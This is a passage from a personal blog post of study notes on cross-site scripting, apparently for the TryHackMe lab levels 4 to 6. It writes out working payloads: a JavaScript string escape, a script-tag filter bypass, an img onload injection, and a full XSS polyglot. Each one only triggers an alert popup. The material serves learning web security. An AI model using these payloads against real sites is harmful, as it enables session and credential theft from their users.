```html
<div class="text-center">
	<h2>Hello, <textarea></textarea><script>alert('Archtrmntor');</script></textarea></h2>
</div>
```


##### <span style="color: pink;"><b>Level 4</b></span>
-------------

- as same as above Entering your name into the form, you'll see it reflected on the page. When we look at the Source code we our name reflected in the JavaScript Code . ( below image )
- first we have to escape the using `'` that closes the field specifying the name , then `;` signifies the end of the current command , and `//` in the end , that makes anything after this as a comment rather than executable code . 
- Our payload : `';alert('Devin');//`
- You'll now see the string Devin in an alert popup when you hit the enter button.

![[Pasted image 20240915132627.png]](https://i.imghippo.com/files/22dhI1726747374.png)

- source code after our payload got executed .

```JavaScript
<script>
	document.getElementsByClassName('name')[0].innerHTML='';alert('Devin');//;
</script>
```


##### <span style="color: pink;"><b>Level 5</b></span>
------------

- This look similar to the level 1 but in this our payload `<script>alert('THM');</script>` don't work . 
- When we look at the source code ( in below image ) , we can see that our `<script>` tag is removed automatically . means server has that is a filter that strips out any dangerous string  or word.
- Here are the Some tricks that you can apply to get your code working 

Original Payload : `<sscriptcript>alert('THM');</sscriptcript>`
Text to be removed ( by filter ) : ``<sscriptcript>alert('THM');</sscriptcript>``
Final Payload ( after passing through the filter ) : ``<script>alert('THM');</script>``

- When you click the enter button after entering the payload alert('THM'); the string THM will appear in an alert popup.

- successful execution of the payload in these types of cases is depend upon how is server filtering out our request and what strips out and what reflects in the output then after some hit and trail we can craft our payload successfully that works for us 😁


![[Pasted image 20240915132915.png]](https://i.imghippo.com/files/fgdCv1726747381.png)


##### <span style="color: pink;"><b>Level 6</b></span>
--------------------

- We can try ">," but it doesn't seem to function, much like level two where we had to escape from the value attribute of an input element. To find out why that doesn't work, let's examine the page code. ( in image below ).
- we can see our `< and >`  character get filtered out form our payload , this might prevent us to escape the IMG tag . 
- We can use the extra properties of the IMG tag, like the _onload event_, to get around the filter. After the picture supplied in the src property has loaded onto the web page, the onload event runs the code of your choice.
- Crafted Payload : `/images/cat.jpg" onload="alert('THM');`

![[Pasted image 20240915142414.png]](https://i.imghippo.com/files/1xiao1726747364.png)

- and out course code look like after it will execute 

```html
<div class="text-center">
	<h2>Your Picture</h2>
	<img src="/image/cat.jpg" onload="alert('THM');">
</div>
```

 When you click the enter button after entering the payload alert('THM'); the string THM will appear in an alert popup.

<p style="color: #FFA500; text-shadow: 0 0 5px #FFD700, 0 0 10px #FFD700, 0 0 20px #FF8C00, 0 0 30px #FF8C00;">POLYGLOTS:</p>

A text string that has the ability to simultaneously escape attributes, tags, and filters is known as an XSS polyglot. All six of the stages you just finished could have been completed using the polyglot below, and the code would have been correctly run.

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```










-------------------------------------------------------------------------------------------------


#### <b>Final Thoughts</b>

This blog is a reflection of my personal notes, and while you may find similar examples online, the goal here is to focus on learning. I've summarized these notes in a cleaner format, making it easier for me to refer back when needed. I'll be updating this blog in the future with material from PortSwigger labs and other valuable resources I come across. If the content becomes more advanced, I may create a separate blog post to cover those topics. Stay tuned for more updates, and I hope this space continues to be helpful in your learning journey!. If you find this blog helpful, I'd love to hear your thoughts—my inbox is always open for feedback. Please excuse any typos, and feel free to point them out so I can correct them. Thanks for understanding and happy learning!. You can contact me on [twitter](https://twitter.com/archtrmntor) or [Linkedin](https://www.linkedin.com/in/hitesh-sharma-413862245)
























